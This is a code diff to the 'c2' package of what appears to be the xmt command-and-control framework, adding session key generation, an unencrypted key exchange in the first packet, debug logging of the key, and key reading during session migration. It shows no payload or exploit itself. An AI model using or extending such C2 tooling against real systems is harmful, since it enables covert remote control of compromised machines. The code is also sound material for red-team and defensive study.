@@ -4,6 +4,7 @@ package c2
 
 import (
 	"context"
+	"io"
 	"net"
 	"os"
 	"strconv"
@@ -13,10 +14,12 @@ import (
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/pipe"
+	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/local"
 	"github.com/iDigitalFlame/xmt/util"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -124,6 +127,14 @@ func ConnectContext(x context.Context, l logx.Log, p Profile) (*Session, error) 
 		s.jitter = DefaultJitter
 	}
 	s.Device.MarshalStream(n)
+	// KeyCrypt: Generate initial key set here, append to the Packet.
+	//           This Packet is NOT encrypted.
+	if s.generateSessionKey(n); cout.Enabled {
+		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details [%v].", s.ID, s.key)
+	}
 	if err = writePacket(c, s.w, s.t, n); err != nil {
 		c.Close()
 		return nil, xerr.Wrap("first Packet write", err)
@@ -246,6 +257,14 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		s = &Session{ID: i, Device: *local.Device.Machine}
 		h string
 	)
+	// KeyCrypt: Migration data to transfer the Session key.
+	if v, err1 := r.Read(s.key[:]); err1 != nil {
+		c.Close()
+		return nil, xerr.Wrap("read Session Key", err1)
+	} else if v != data.KeySize {
+		c.Close()
+		return nil, xerr.Wrap("read Session Key", io.ErrUnexpectedEOF)
+	}
 	if h, s.w, s.t = p.Next(); len(h) == 0 {
 		c.Close()
 		return nil, ErrNoHost
